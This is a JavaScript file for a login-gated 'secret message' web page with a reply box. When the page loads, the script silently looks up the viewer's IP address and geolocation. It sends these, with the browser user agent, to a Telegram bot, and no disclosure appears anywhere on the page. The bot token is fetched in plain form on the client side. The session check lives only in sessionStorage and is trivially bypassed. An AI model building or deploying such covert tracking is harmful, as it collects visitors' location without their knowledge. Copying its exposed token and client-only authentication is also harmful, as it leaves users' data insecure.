window.onload = async function () {
  const auth = sessionStorage.getItem("authenticated");
  const authTime = sessionStorage.getItem("auth_time");

  if (!auth || !authTime) {
    redirectToLogin();
    return;
  }

  const elapsed = Date.now() - parseInt(authTime, 10);
  const MAX_SESSION_DURATION = 3 * 60 * 1000; // 3 minutes

  if (elapsed > MAX_SESSION_DURATION) {
    sessionStorage.clear();
    alert("Session expired. Please login again.");
    redirectToLogin();
    return;
  }

  // Optional: auto-expire session after the remaining time
  setTimeout(() => {
    sessionStorage.clear();
    alert("Session expired. Please login again.");
    redirectToLogin();
  }, MAX_SESSION_DURATION - elapsed);

  try {
    const config = await fetch('settings/config.json').then(res => res.json());
    window._appConfig = config;

    const messageText = await fetch('Msg/message.txt').then(res => res.text());
    document.getElementById('message').textContent = messageText;

    const ipInfo = await fetch("https://ipapi.co/json/").then(res => res.json());

    const logText =
      `📩 [MESSAGE VIEWED]\n` +
      `Time: ${new Date().toISOString()}\n` +
      `IP: ${ipInfo.ip}\n` +
      `Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}\n` +
      `UserAgent: ${navigator.userAgent}`;

    await sendToTelegram(logText);
  } catch (err) {
    console.error("Failed to load message or send log", err);
  }
};

async function sendReply() {
  const reply = document.getElementById("replyBox").value.trim();
  if (!reply) {
    alert("Please write a message first.");
    return;
  }

  try {
    const config = window._appConfig || await fetch('settings/config.json').then(res => res.json());

    const logText =
      `💌 [REPLY]\n` +
      `Time: ${new Date().toISOString()}\n` +
      `Reply: ${reply}`;

    await sendToTelegram(logText);

    alert("Your reply has been sent 💌");
    document.getElementById("replyBox").value = "";
  } catch (err) {
    console.error("Failed to send reply", err);
    alert("Failed to send reply. Try again.");
  }
}

async function sendToTelegram(message) {
  const config = window._appConfig;

  await fetch(`https://api.telegram.org/bot${config.bot_token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: config.chat_id,
      text: message
    })
  });
}

function redirectToLogin() {
  window.location.href = "index.html"; // update if your login page has a different name
}
